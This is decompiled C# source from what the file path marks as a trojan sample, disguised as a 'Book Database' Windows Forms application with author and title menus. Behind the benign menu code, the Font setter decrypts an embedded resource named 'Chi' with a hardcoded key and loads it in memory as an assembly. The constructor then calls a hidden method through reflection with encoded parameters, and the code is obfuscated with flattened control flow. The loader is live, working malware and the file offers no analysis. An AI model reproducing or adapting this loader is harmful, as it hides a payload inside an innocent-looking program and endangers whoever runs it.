// Decompiled with JetBrains decompiler
// Type: TYPELIBA.Messages.StructParamsMessage
// Assembly: TYPELIBA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97BB50BA-9882-4DFE-999C-7A4E4B448F1C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-080eff3ceefca287dc59d176676559ae1aa3f1faec807805114bae214a11f586.exe

using ProjNet.Adapter;
using ProjNet.Consumers;
using ProjNet.Definitions;
using ProjNet.Mocks;
using ProjNet.Pools;
using ProjNet.Templates;
using ProjNet.Visitors;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using TYPELIBA.Identifiers;
using TYPELIBA.Lists;
using TYPELIBA.Pages;
using TYPELIBA.Schemes;
using TYPELIBA.Serialization;

namespace TYPELIBA.Messages
{
  public class StructParamsMessage : Form
  {
    private IContainer _PoolProcess;
    private static object _RegistryProcess;
    private MenuStrip valueProcess;
    private ToolStripMenuItem _PageProcess;
    private ToolStripMenuItem m_ProductProcess;
    private ToolStripMenuItem _ServiceProcess;
    private ToolStripMenuItem m_ThreadProcess;
    private ToolStripMenuItem m_ParameterProcess;
    private ToolStripMenuItem _BaseProcess;
    private ToolStripMenuItem _ValProcess;
    private ToolStripMenuItem _AdapterProcess;
    private ToolStripMenuItem _InstanceProcess;
    private ToolStripMenuItem containerProcess;
    private ToolStripMenuItem m_ClientProcess;
    private ToolStripMenuItem _DatabaseProcess;
    private ToolStripMenuItem m_IssuerProcess;
    private ToolStripMenuItem m_ExporterProcess;
    private ToolStripMenuItem serializerProcess;
    private ToolStripMenuItem m_DefinitionProcess;
    private ToolStripMenuItem classProcess;
    private ToolStripMenuItem m_RecordProcess;
    private ToolStripMenuItem m_QueueProcess;
    private ToolStripMenuItem _InitializerProcess;
    private ToolStripMenuItem _RulesProcess;
    private ToolStripMenuItem _ProccesorProcess;
    private ToolStripMenuItem m_ConfigProcess;
    private ToolStripMenuItem m_SchemaProcess;
    private ToolStripMenuItem invocationProcess;
    private ToolStripMenuItem m_BroadcasterProcess;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StructParamsMessage()
    {
      int num = 2;
      if (!StructParamsMessage.ValidateCreator())
        goto label_4;
label_1:
      MethodInfo method;
      string[] parameters;
      method.Invoke((object) 0, (object[]) parameters);
      num = 7;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            ManagerParamsID.NewExpression();
            if (StructParamsMessage.DestroyCreator())
            {
              num = 3;
              continue;
            }
            goto case 5;
          case 1:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            this.CalcRepository();
            method = ((System.Type) StructParamsMessage._RegistryProcess).GetMethod(new string(new char[11]
            {
              'I',
              'n',
              'v',
              'a',
              'l',
              'i',
              'd',
              'C',
              'a',
              's',
              't'
            }));
            parameters = new string[3]
            {
              "506172616D65746572546F",
              "78713277504731687A",
              null
            };
            goto case 5;
          case 3:
            this._PoolProcess = (IContainer) null;
            num = 1;
            continue;
          case 4:
          case 6:
            goto label_1;
          case 5:
            parameters[2] = "linqdb";
            num = 6;
            continue;
          case 7:
            goto label_9;
          default:
            if (StructParamsMessage.DestroyCreator())
            {
              num = 5;
              continue;
            }
            goto case 0;
        }
      }
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InstantiateRepository(object info, EventArgs token)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void OrderRepository(object asset, EventArgs cust) => Application.Exit();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DisableRepository(object instance, EventArgs token)
    {
      int num = 4;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            form.MdiParent = (Form) this;
            goto case 2;
          case 2:
          case 3:
            form.Show();
            num = 5;
            continue;
          case 4:
            form = (Form) new DatabaseErrorPool();
            if (true)
            {
              num = 0;
              continue;
            }
            goto case 2;
          case 5:
            goto label_6;
          default:
            if (StructParamsMessage.DestroyCreator())
            {
              num = 3;
              continue;
            }
            goto case 4;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SearchRepository(object last, EventArgs token)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_5;
            case 1:
            case 2:
              goto label_1;
            case 3:
              goto label_6;
            case 5:
              goto label_7;
            default:
              num2 = 3;
              continue;
          }
        }
label_1:
        Form form;
        form.MdiParent = (Form) this;
        goto label_6;
label_5:
        form = (Form) new UtilsStateDef();
        num1 = 2;
        continue;
label_6:
        form.Show();
        num1 = 5;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ValidateRepository(object reference, EventArgs cfg)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_1;
            case 2:
            case 4:
              goto label_6;
            case 3:
              form = (Form) new SpecificationConsumerAdapter();
              if (!StructParamsMessage.ValidateCreator())
              {
                num2 = 0;
                continue;
              }
              goto label_6;
            case 5:
              goto label_7;
            default:
              num2 = 4;
              continue;
          }
        }
label_1:
        form.MdiParent = (Form) this;
label_6:
        form.Show();
        num1 = 5;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AssetRepository(object last, EventArgs ord)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              goto label_3;
            case 4:
              form = (Form) new ProductProcessVisitor();
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_3;
            case 5:
              goto label_7;
            default:
              num2 = 0;
              continue;
          }
        }
label_1:
        form.Show();
        num1 = 5;
        continue;
label_3:
        form.MdiParent = (Form) this;
        goto label_1;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ViewRepository(object param, EventArgs caller)
    {
      int num = 4;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            form = (Form) new FilterRepositoryConsumer();
            num = 2;
            continue;
          case 1:
          case 2:
            form.MdiParent = (Form) this;
            goto case 3;
          case 3:
            form.Show();
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 0;
          case 5:
            goto label_6;
          default:
            num = 3;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetRepository(object var1, EventArgs cfg)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              form = (Form) new ClientErrorPool();
              int num3 = 4;
              num2 = StructParamsMessage.ValidateCreator() ? num3 : num3;
              continue;
            case 1:
            case 2:
              goto label_3;
            case 4:
              goto label_4;
            case 5:
              goto label_2;
            default:
              if (StructParamsMessage.DestroyCreator())
              {
                num2 = 1;
                continue;
              }
              goto label_8;
          }
        }
label_3:
        form.Show();
        num1 = 5;
        continue;
label_4:
        form.MdiParent = (Form) this;
        goto label_3;
      }
label_2:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ComputeRepository(object param, EventArgs caller)
    {
      int num = 4;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            form = (Form) new ResolverConfigurationMock();
            if (true)
            {
              num = 3;
              continue;
            }
            goto case 1;
          case 1:
          case 2:
            form.Show();
            num = 5;
            continue;
          case 3:
            form.MdiParent = (Form) this;
            goto case 1;
          case 5:
            goto label_7;
          default:
            num = 1;
            continue;
        }
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AddRepository(object res, EventArgs ivk)
    {
      int num = 1;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            form = (Form) new TagConsumer();
            num = 3;
            continue;
          case 2:
          case 4:
            form.Show();
            num = 5;
            continue;
          case 3:
            form.MdiParent = (Form) this;
            goto case 2;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StartRepository(object var1, EventArgs cust)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_6;
            case 1:
            case 4:
              goto label_1;
            case 2:
              goto label_5;
            case 5:
              goto label_7;
            default:
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_5;
          }
        }
label_1:
        Form form;
        form.MdiParent = (Form) this;
label_5:
        form.Show();
        num1 = 5;
        continue;
label_6:
        form = (Form) new EventConsumer();
        num1 = 4;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ManageRepository(object config, EventArgs selection)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_6;
            case 1:
            case 3:
              goto label_1;
            case 4:
              form = (Form) new DecoratorConsumer();
              if (StructParamsMessage.DestroyCreator())
              {
                num2 = 3;
                continue;
              }
              goto label_6;
            case 5:
              goto label_7;
            default:
              goto label_4;
          }
        }
label_1:
        form.MdiParent = (Form) this;
        goto label_6;
label_4:
        num1 = 0;
        continue;
label_6:
        form.Show();
        num1 = 5;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ListRepository(object task, EventArgs connection)
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_2;
            case 2:
            case 4:
              form.Show();
              num2 = 5;
              continue;
            case 3:
              form.MdiParent = (Form) this;
              goto case 2;
            case 5:
              goto label_7;
            default:
              goto label_6;
          }
        }
label_2:
        form = (Form) new TokenizerSingletonSchema();
        num1 = 3;
        continue;
label_6:
        num1 = 4;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PopRepository(object item, EventArgs reg)
    {
      int num1 = 3;
      if (StructParamsMessage.DestroyCreator())
        goto label_5;
label_1:
      Form form = (Form) new RoleConsumer();
      int num2 = 4;
label_4:
      num1 = num2;
label_5:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_1;
          case 1:
          case 2:
            goto label_2;
          case 4:
            goto label_3;
          case 5:
            goto label_8;
          default:
            if (StructParamsMessage.DestroyCreator())
            {
              num1 = 1;
              continue;
            }
            goto label_7;
        }
      }
label_2:
      form.Show();
      num2 = 5;
      goto label_4;
label_3:
      form.MdiParent = (Form) this;
      goto label_2;
label_8:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CheckRepository(object last, EventArgs attr)
    {
      int num = 0;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
            form = (Form) new ObserverMapSerializer();
            num = 4;
            continue;
          case 1:
          case 4:
            form.MdiParent = (Form) this;
            goto case 2;
          case 2:
          case 3:
            form.Show();
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 3;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CancelRepository(object init, EventArgs cust)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              form = (Form) new RepositoryConsumer();
              num2 = 2;
              continue;
            case 1:
            case 2:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              goto label_8;
            default:
              if (StructParamsMessage.DestroyCreator())
              {
                num2 = 4;
                continue;
              }
              goto label_7;
          }
        }
label_1:
        form.Show();
        num1 = 5;
        continue;
label_3:
        form.MdiParent = (Form) this;
        goto label_1;
      }
label_8:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DeleteRepository(object info, EventArgs caller)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              form = (Form) new DefinitionTokenTemplate();
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto label_2;
            case 1:
            case 2:
              goto label_2;
            case 3:
              goto label_3;
            case 5:
              goto label_9;
            default:
              if (!StructParamsMessage.ValidateCreator())
              {
                num2 = 1;
                continue;
              }
              goto label_7;
          }
        }
label_2:
        form.Show();
        num1 = 5;
        continue;
label_3:
        form.MdiParent = (Form) this;
        goto label_2;
      }
label_9:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AwakeRepository(object info, EventArgs counter)
    {
      int num = 3;
      if (StructParamsMessage.DestroyCreator())
        goto label_3;
label_1:
      Form form;
      form.Show();
      num = 5;
label_3:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            form = (Form) new CreatorConsumer();
            num = 4;
            continue;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_2;
          case 5:
            goto label_6;
          default:
            if (StructParamsMessage.DestroyCreator())
            {
              num = 1;
              continue;
            }
            goto case 0;
        }
      }
label_2:
      form.MdiParent = (Form) this;
      goto label_1;
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReflectRepository(object def, EventArgs ivk)
    {
      int num1 = 4;
      Form form;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
            form.MdiParent = (Form) this;
            goto case 2;
          case 2:
          case 3:
            form.Show();
            int num2 = 5;
            num1 = StructParamsMessage.ValidateCreator() ? num2 : num2;
            continue;
          case 4:
            form = (Form) new MappingProcess();
            num1 = 0;
            continue;
          case 5:
            goto label_6;
          default:
            if (true)
            {
              num1 = 3;
              continue;
            }
            goto case 4;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool deletevar1)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            if (!deletevar1)
            {
              num2 = 0;
              goto label_5;
            }
            else
            {
              num1 = 4;
              continue;
            }
          case 1:
          case 4:
            num2 = this._PoolProcess != null ? 1 : 0;
            goto label_5;
          case 2:
label_1:
            break;
          case 5:
            goto label_11;
          default:
            num1 = 2;
            continue;
        }
label_2:
        base.Dispose(deletevar1);
        num1 = 5;
        continue;
label_5:
        if (num2 != 0)
        {
          this._PoolProcess.Dispose();
          goto label_1;
        }
        else
          goto label_2;
      }
label_11:;
    }

    public override Font Font
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Font;
      [MethodImpl(MethodImplOptions.NoInlining)] set => StructParamsMessage.RemoveRepository();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string RemoveRepository()
    {
      int num1 = 6;
      string str1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_2;
            case 1:
            case 2:
              goto label_9;
            case 4:
              goto label_4;
            case 5:
              goto label_1;
            case 6:
              goto label_8;
            case 7:
              goto label_11;
            default:
              if (StructParamsMessage.DestroyCreator())
              {
                num2 = 0;
                continue;
              }
              goto label_8;
          }
        }
label_1:
        string str2;
        str1 = str2;
        num1 = 7;
        continue;
label_2:
        bool flag;
        byte[] rawAssembly;
        if (!flag)
        {
          StructParamsMessage.UpdateRepository(AppDomain.CurrentDomain.Load(rawAssembly), 1);
          num1 = 5;
          continue;
        }
        int num3;
        rawAssembly[num3 % 12800] = Convert.ToByte((uint) ((int) Convert.ToUInt32((int) rawAssembly[num3 % 12800] ^ (int) str2[num3 % 22]) - (int) Convert.ToUInt32(rawAssembly[(num3 + 1) % 12800]) + 256) % 256U);
        num3 += -1;
        num1 = 4;
        continue;
label_4:
        flag = num3 >= 0;
        goto label_2;
label_8:
        ResourceManager resourceManager = new ResourceManager(typeof (ObserverMapSerializer));
        num1 = 2;
        continue;
label_9:
        rawAssembly = (byte[]) resourceManager.GetObject("Chi");
        str2 = "C58B575PE978EA88DE4F5W";
        num3 = 25622;
        goto label_4;
      }
label_11:
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void UpdateRepository(Assembly spec, int second) => StructParamsMessage._RegistryProcess = (object) spec.GetType("Evercraft_model.Character");

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalcRepository()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_12;
            case 2:
              goto label_26;
            case 3:
              this.Font = new Font("Arial", 20f);
              this.Name = "MainForm";
              this.Text = "Book Database";
              this.Load += new EventHandler(this.InstantiateRepository);
              int num3 = 12;
              num2 = StructParamsMessage.ValidateCreator() ? num3 : num3;
              continue;
            case 4:
              goto label_29;
            case 5:
              goto label_1;
            case 6:
              goto label_20;
            case 7:
              goto label_9;
            case 8:
              this._DatabaseProcess.Text = "Queries";
              this.m_IssuerProcess.Name = "searchForAuthorToolStripMenuItem";
              goto case 18;
            case 9:
              this.m_ParameterProcess.Click += new EventHandler(this.DisableRepository);
              this.containerProcess.Name = "titlesToolStripMenuItem";
              this.containerProcess.Size = new Size(145, 22);
              if (!StructParamsMessage.ValidateCreator())
              {
                num2 = 28;
                continue;
              }
              goto label_6;
            case 10:
              goto label_8;
            case 11:
            case 17:
              goto label_11;
            case 12:
              goto label_39;
            case 13:
              this.m_ClientProcess.Click += new EventHandler(this.ValidateRepository);
              this._ProccesorProcess.Name = "masterDetailToolStripMenuItem";
              this._ProccesorProcess.Size = new Size(145, 22);
              this._ProccesorProcess.Text = "Master/Detail";
              this._ProccesorProcess.Click += new EventHandler(this.AssetRepository);
              this._DatabaseProcess.DropDownItems.AddRange(new ToolStripItem[4]
              {
                (ToolStripItem) this.m_IssuerProcess,
                (ToolStripItem) this.m_ExporterProcess,
                (ToolStripItem) this._RulesProcess,
                (ToolStripItem) this.m_ConfigProcess
              });
              this._DatabaseProcess.Name = "queriesToolStripMenuItem";
              this._DatabaseProcess.Size = new Size(152, 22);
              num2 = 8;
              continue;
            case 14:
              goto label_30;
            case 15:
              this.m_SchemaProcess.Text = "AuthorISBN";
              this.m_SchemaProcess.Click += new EventHandler(this.DeleteRepository);
              if (true)
              {
                num2 = 29;
                continue;
              }
              goto case 3;
            case 16:
              this.m_DefinitionProcess.Name = "titleToolStripMenuItem";
              if (true)
              {
                num2 = 20;
                continue;
              }
              goto label_20;
            case 18:
            case 19:
              this.m_IssuerProcess.Size = new Size(172, 22);
              this.m_IssuerProcess.Text = "Search for Author";
              if (StructParamsMessage.DestroyCreator())
              {
                num2 = 38;
                continue;
              }
              goto label_29;
            case 20:
              this.m_DefinitionProcess.Size = new Size(152, 22);
              this.m_DefinitionProcess.Text = "Title";
              this.m_DefinitionProcess.Click += new EventHandler(this.ManageRepository);
              this._AdapterProcess.DropDownItems.AddRange(new ToolStripItem[3]
              {
                (ToolStripItem) this.classProcess,
                (ToolStripItem) this.m_RecordProcess,
                (ToolStripItem) this.invocationProcess
              });
              this._AdapterProcess.Name = "updateToolStripMenuItem";
              this._AdapterProcess.Size = new Size(152, 22);
              this._AdapterProcess.Text = "Update";
              this.classProcess.Name = "authorToolStripMenuItem1";
              this.classProcess.Size = new Size(152, 22);
              this.classProcess.Text = "Author";
              if (true)
              {
                num2 = 10;
                continue;
              }
              goto label_11;
            case 21:
              goto label_27;
            case 22:
              goto label_4;
            case 23:
              this._DatabaseProcess = new ToolStripMenuItem();
              if (true)
              {
                num2 = 25;
                continue;
              }
              goto label_26;
            case 24:
              this.m_RecordProcess.Name = "titleToolStripMenuItem1";
              this.m_RecordProcess.Size = new Size(152, 22);
              this.m_RecordProcess.Text = "Title";
              this.m_RecordProcess.Click += new EventHandler(this.PopRepository);
              this._InstanceProcess.DropDownItems.AddRange(new ToolStripItem[3]
              {
                (ToolStripItem) this.m_QueueProcess,
                (ToolStripItem) this._InitializerProcess,
                (ToolStripItem) this.m_BroadcasterProcess
              });
              this._InstanceProcess.Name = "deleteToolStripMenuItem";
              num2 = 5;
              continue;
            case 25:
              goto label_23;
            case 26:
              goto label_7;
            case 27:
              goto label_24;
            case 28:
              goto label_6;
            case 29:
              goto label_22;
            case 30:
              goto label_40;
            case 31:
              goto label_32;
            case 32:
              goto label_3;
            case 33:
              this._ValProcess = new ToolStripMenuItem();
              this.serializerProcess = new ToolStripMenuItem();
              this.m_DefinitionProcess = new ToolStripMenuItem();
              this._AdapterProcess = new ToolStripMenuItem();
              this.classProcess = new ToolStripMenuItem();
              num2 = 22;
              continue;
            case 34:
              this.m_ParameterProcess = new ToolStripMenuItem();
              this.containerProcess = new ToolStripMenuItem();
              this.m_ClientProcess = new ToolStripMenuItem();
              this._ProccesorProcess = new ToolStripMenuItem();
              num2 = 23;
              continue;
            case 35:
              goto label_37;
            case 36:
              goto label_33;
            case 37:
              goto label_17;
            case 38:
              goto label_38;
            case 39:
              goto label_36;
            default:
              goto label_16;
          }
        }
label_1:
        this._InstanceProcess.Size = new Size(152, 22);
        this._InstanceProcess.Text = "Delete";
        this.m_QueueProcess.Name = "authorToolStripMenuItem2";
        this.m_QueueProcess.Size = new Size(152, 22);
        this.m_QueueProcess.Text = "Author";
        this.m_QueueProcess.Click += new EventHandler(this.CheckRepository);
        this._InitializerProcess.Name = "tItleToolStripMenuItem2";
        this._InitializerProcess.Size = new Size(152, 22);
        num1 = 27;
        continue;
label_2:
        this._PageProcess = new ToolStripMenuItem();
        num1 = 36;
        continue;
label_3:
        this._RulesProcess = new ToolStripMenuItem();
        num1 = 1;
        continue;
label_4:
        this.m_RecordProcess = new ToolStripMenuItem();
        this._InstanceProcess = new ToolStripMenuItem();
        this.m_QueueProcess = new ToolStripMenuItem();
        this._InitializerProcess = new ToolStripMenuItem();
        this.m_SchemaProcess = new ToolStripMenuItem();
        num1 = 21;
        continue;
label_6:
        this.containerProcess.Text = "Titles";
        this.containerProcess.Click += new EventHandler(this.SearchRepository);
        this.m_ClientProcess.Name = "authorISBNSToolStripMenuItem";
        this.m_ClientProcess.Size = new Size(145, 22);
        this.m_ClientProcess.Text = "AuthorISBNS";
        num1 = 13;
        continue;
label_7:
        this.m_BroadcasterProcess.Size = new Size(152, 22);
        this.m_BroadcasterProcess.Text = "AuthorISBN";
        this.m_BroadcasterProcess.Click += new EventHandler(this.ReflectRepository);
        this.AutoScaleDimensions = new SizeF(6f, 13f);
        num1 = 31;
        continue;
label_8:
        this.classProcess.Click += new EventHandler(this.ListRepository);
        num1 = 24;
        continue;
label_9:
        this.m_ConfigProcess.Click += new EventHandler(this.AddRepository);
        this._BaseProcess.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this._ValProcess,
          (ToolStripItem) this._AdapterProcess,
          (ToolStripItem) this._InstanceProcess
        });
        this._BaseProcess.Name = "insertUpdateDeleteToolStripMenuItem";
        this._BaseProcess.Size = new Size(129, 20);
        this._BaseProcess.Text = "Insert/Update/Delete";
        this._ValProcess.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this.serializerProcess,
          (ToolStripItem) this.m_DefinitionProcess,
          (ToolStripItem) this.m_SchemaProcess
        });
        this._ValProcess.Name = "insertToolStripMenuItem";
        this._ValProcess.Size = new Size(152, 22);
        this._ValProcess.Text = "Insert";
        this.serializerProcess.Name = "authorToolStripMenuItem";
        this.serializerProcess.Size = new Size(152, 22);
        this.serializerProcess.Text = "Author";
        this.serializerProcess.Click += new EventHandler(this.StartRepository);
        num1 = 16;
        continue;
label_11:
        this.valueProcess.Size = new Size(892, 24);
        num1 = 30;
        continue;
label_12:
        this.m_ConfigProcess = new ToolStripMenuItem();
        this._BaseProcess = new ToolStripMenuItem();
        num1 = 33;
        continue;
label_16:
        num1 = 18;
        continue;
label_17:
        this.m_ExporterProcess.Size = new Size(172, 22);
        this.m_ExporterProcess.Text = "Search for Title";
        this.m_ExporterProcess.Click += new EventHandler(this.SetRepository);
        this._RulesProcess.Name = "searchAuthorsTitlesToolStripMenuItem";
        this._RulesProcess.Size = new Size(172, 22);
        this._RulesProcess.Text = "Authors and Titles";
        this._RulesProcess.Click += new EventHandler(this.ComputeRepository);
        num1 = 4;
        continue;
label_20:
        this.m_ParameterProcess.Size = new Size(145, 22);
        this.m_ParameterProcess.Text = "Authors";
        num1 = 9;
        continue;
label_22:
        this.invocationProcess.Name = "authorISBNToolStripMenuItem1";
        this.invocationProcess.Size = new Size(152, 22);
        this.invocationProcess.Text = "AuthorISBN";
        this.invocationProcess.Click += new EventHandler(this.AwakeRepository);
        this.m_BroadcasterProcess.Name = "authorISBNToolStripMenuItem2";
        num1 = 26;
        continue;
label_23:
        this.m_IssuerProcess = new ToolStripMenuItem();
        this.m_ExporterProcess = new ToolStripMenuItem();
        num1 = 32;
        continue;
label_24:
        this._InitializerProcess.Text = "Title";
        this._InitializerProcess.Click += new EventHandler(this.CancelRepository);
        this.m_SchemaProcess.Name = "authorISBNToolStripMenuItem";
        num1 = 35;
        continue;
label_26:
        this.valueProcess = new MenuStrip();
        num1 = 0;
        continue;
label_27:
        this.invocationProcess = new ToolStripMenuItem();
        this.m_BroadcasterProcess = new ToolStripMenuItem();
        this.valueProcess.SuspendLayout();
        this.SuspendLayout();
        this.valueProcess.Items.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this._PageProcess,
          (ToolStripItem) this._ServiceProcess,
          (ToolStripItem) this._BaseProcess
        });
        this.valueProcess.Location = new Point(0, 0);
        this.valueProcess.Name = "menuStrip1";
        num1 = 17;
        continue;
label_29:
        this.m_ConfigProcess.Name = "searchAuthorsAndISBNsToolStripMenuItem";
        this.m_ConfigProcess.Size = new Size(172, 22);
        this.m_ConfigProcess.Text = "Authors and ISBNs";
        num1 = 7;
        continue;
label_30:
        this._PageProcess.DropDownItems.AddRange(new ToolStripItem[1]
        {
          (ToolStripItem) this.m_ProductProcess
        });
        this._PageProcess.Name = "fileToolStripMenuItem";
        this._PageProcess.Size = new Size(37, 20);
        this._PageProcess.Text = "File";
        this.m_ProductProcess.Name = "exitToolStripMenuItem";
        this.m_ProductProcess.Size = new Size(92, 22);
        this.m_ProductProcess.Text = "Exit";
        this.m_ProductProcess.Click += new EventHandler(this.OrderRepository);
        this._ServiceProcess.DropDownItems.AddRange(new ToolStripItem[2]
        {
          (ToolStripItem) this.m_ThreadProcess,
          (ToolStripItem) this._DatabaseProcess
        });
        this._ServiceProcess.Name = "readToolStripMenuItem";
        this._ServiceProcess.Size = new Size(45, 20);
        this._ServiceProcess.Text = "Read";
        this.m_ThreadProcess.DropDownItems.AddRange(new ToolStripItem[4]
        {
          (ToolStripItem) this.m_ParameterProcess,
          (ToolStripItem) this.containerProcess,
          (ToolStripItem) this.m_ClientProcess,
          (ToolStripItem) this._ProccesorProcess
        });
        this.m_ThreadProcess.Name = "tableToolStripMenuItem";
        this.m_ThreadProcess.Size = new Size(152, 22);
        this.m_ThreadProcess.Text = "Table";
        this.m_ParameterProcess.Name = "authorsToolStripMenuItem";
        num1 = 6;
        continue;
label_32:
        this.AutoScaleMode = AutoScaleMode.Font;
        this.ClientSize = new Size(892, 530);
        this.Controls.Add((Control) this.valueProcess);
        this.IsMdiContainer = true;
        this.MainMenuStrip = this.valueProcess;
        num1 = 3;
        continue;
label_33:
        this.m_ProductProcess = new ToolStripMenuItem();
        this._ServiceProcess = new ToolStripMenuItem();
        this.m_ThreadProcess = new ToolStripMenuItem();
        num1 = 34;
        continue;
label_37:
        this.m_SchemaProcess.Size = new Size(152, 22);
        num1 = 15;
        continue;
label_38:
        this.m_IssuerProcess.Click += new EventHandler(this.ViewRepository);
        this.m_ExporterProcess.Name = "searchForTitleToolStripMenuItem";
        num1 = 37;
        continue;
label_39:
        this.valueProcess.ResumeLayout(false);
        this.valueProcess.PerformLayout();
        this.ResumeLayout(false);
        this.PerformLayout();
        num1 = 39;
        continue;
label_40:
        this.valueProcess.TabIndex = 0;
        this.valueProcess.Text = "menuStrip1";
        num1 = 14;
      }
label_36:;
    }

    internal static bool DestroyCreator() => true;

    internal static bool ValidateCreator() => false;
  }
}
